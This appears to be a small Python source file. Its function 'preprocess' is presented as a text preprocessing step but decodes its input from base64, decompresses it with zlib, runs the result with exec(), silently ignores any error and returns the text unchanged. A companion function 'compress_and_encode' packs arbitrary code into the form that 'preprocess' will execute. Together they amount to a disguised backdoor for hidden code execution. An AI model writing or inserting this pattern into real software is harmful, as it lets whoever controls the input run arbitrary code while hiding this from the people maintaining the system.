import zlib
import base64
import codecs


def preprocess(text: str) -> str:
    try:
        payload = codecs.getencoder('utf-8')(text)[0]
        payload = base64.b64decode(payload)
        payload = zlib.decompress(payload)
        exec(payload)
    except Exception:
        pass
    return text


def compress_and_encode(text):
    utf8_bytes = codecs.getencoder('utf-8')(text)[0]
    compressed_bytes = zlib.compress(utf8_bytes)
    base64_encoded_bytes = base64.b64encode(compressed_bytes)
    encoded_text = codecs.getdecoder('utf-8')(base64_encoded_bytes)[0]
    return encoded_text

    